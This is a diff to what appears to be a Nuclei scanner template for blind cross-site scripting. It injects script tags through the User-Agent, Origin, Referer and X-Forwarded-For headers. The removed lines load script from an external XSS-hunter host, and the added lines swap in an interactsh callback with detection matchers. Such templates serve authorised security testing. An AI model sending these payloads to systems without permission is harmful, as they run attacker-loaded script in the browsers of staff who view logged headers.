@@ -1,19 +1,29 @@
 id: BXSS
 
 info:
-  name: Blind XSS payloads sending through headers
+  name: Blind XSS via HTTP Headers
   author: thanhnx
-  severity: high
-  tags: XSS
+  severity: medium
+  description: |
+    Sends blind XSS payloads through HTTP headers (User-Agent, Referer, X-Forwarded-For).
+    Requires interactsh or external XSS callback server to detect execution.
+  tags: xss,blind,headers
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}"
 
     headers:
-      User-Agent: '''>"></title></style></textarea></script>"><script src="https://xsshunter.ch1k3n.online"></script>'
-      Origin: '''>"></title></style></textarea></script><script src=https://xsshunter.ch1k3n.online></script>'
-      Referer: '''>"></title></style></textarea></script><script src=https://xsshunter.ch1k3n.online></script>'
-      X-Forwarded-For: '''>"></title></style></textarea></script><script src=https://xsshunter.ch1k3n.online></script>'
-      Test-header: 'Testing for Blind XSS'
+      User-Agent: '"><script src="http://{{interactsh-url}}"></script>'
+      Referer: '"><script src="http://{{interactsh-url}}"></script>'
+      X-Forwarded-For: '"><script src="http://{{interactsh-url}}"></script>'
+      Origin: '"><script src="http://{{interactsh-url}}"></script>'
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
